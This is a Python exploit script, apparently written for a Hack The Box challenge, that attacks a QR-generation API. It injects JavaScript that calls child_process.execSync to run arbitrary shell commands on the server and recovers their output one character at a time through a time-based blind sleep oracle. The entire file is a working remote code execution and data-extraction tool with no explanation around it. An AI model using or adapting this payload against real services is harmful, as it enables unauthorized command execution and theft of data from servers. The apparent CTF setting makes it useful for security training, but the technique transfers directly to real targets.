import requests
import json
import time

# ================= CONFIG =================
server = "94.237.55.124"
port = 50274
EMAIL = "test@hackthebox.com"

SLEEP_TIME = 3
THRESHOLD = 2.5
RETRY = 2
CHARSET = range(32, 127)
# =========================================

url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

# get token
headers = {"Content-Type": "application/json"}
data = {"email": EMAIL}

r = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = r.json()["token"]

print("[+] Token OK")

while True:
    user_input = input("\n> ").strip()
    if not user_input:
        continue

    user_input = user_input.replace("'", '"')
    i = 0

    while True:
        i += 1
        found = False

        for j in CHARSET:
            ch = chr(j)
            hits = 0

            for _ in range(RETRY):
                payload = {
                    "text":
                        "'}) + require('child_process').execSync('"
                        + user_input +
                        " | head -c " + str(i) +
                        " | tail -c 1 | { read c; if [ \"$c\" = \"" +
                        ch +
                        "\" ]; then sleep " + str(SLEEP_TIME) +
                        "; fi; }')//"
                }

                payload_data = json.dumps(payload).replace("\\\\", "\\\\\\")

                headers = {
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {token}"
                }

                resp = requests.post(
                    qr_endpoint,
                    headers=headers,
                    data=payload_data
                )

                if resp.elapsed.total_seconds() >= THRESHOLD:
                    hits += 1

            if hits == RETRY:
                print(ch, end="", flush=True)
                found = True
                break

        if not found:
            break

    print("\n[+] Extraction complete")
